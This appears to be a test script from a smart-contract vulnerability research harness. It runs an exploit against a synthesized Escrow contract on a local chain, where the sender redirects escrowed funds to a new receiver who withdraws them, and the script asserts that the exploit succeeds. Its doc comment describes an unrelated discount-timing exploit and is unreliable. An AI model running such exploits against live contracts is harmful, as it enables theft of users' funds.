require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const getLogger = require('@lib/logging/logger').getLogger;
const exploit3Logger = getLogger('exploit3');


// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'Escrow-3.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);
const { createLoggerWeb3 } = require('@lib/web3/deploy');

/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    exploit3Logger.info('just to make sure this is running...')
    try {
        let { abi } = await compileWithVersion(source, contractFileFullName, 'Escrow', solcVersion);

        let contractInstance = await new web3.eth.Contract(abi, contractAddress);
        const senderAccount = envInfo.accounts[0];
        const originalReceiverAccount = envInfo.accounts[1];
        const newReceiverAccount = envInfo.accounts[2]; // Assuming a new receiver

        const escrowAmount = web3.utils.toWei("1", "ether");

        // Sender places funds in escrow
        await contractInstance.methods.placeInEscrow().send({
            from: senderAccount,
            value: escrowAmount,
            gas: 300000
        });
        await sleep(200);

        // Sender changes the receiver after placing funds in escrow
        await contractInstance.methods.changeReceiver(newReceiverAccount).send({
            from: senderAccount,
            gas: 300000
        });

        await sleep(200);
        // New receiver attempts to withdraw the funds
        const withdrawReceipt = await contractInstance.methods.withdrawFromEscrow().send({
            from: newReceiverAccount,
            gas: 300000
        });

        await sleep(200);
        if (withdrawReceipt.status) {
            console.log("Exploit successful! Funds redirected and withdrawn by new receiver.");
            return true;
        } else {
            console.log("Exploit failed!");
            return false;
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}




/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    exploit3Logger.info(chalk.green("Exploit successful!"));

    return result; 
}
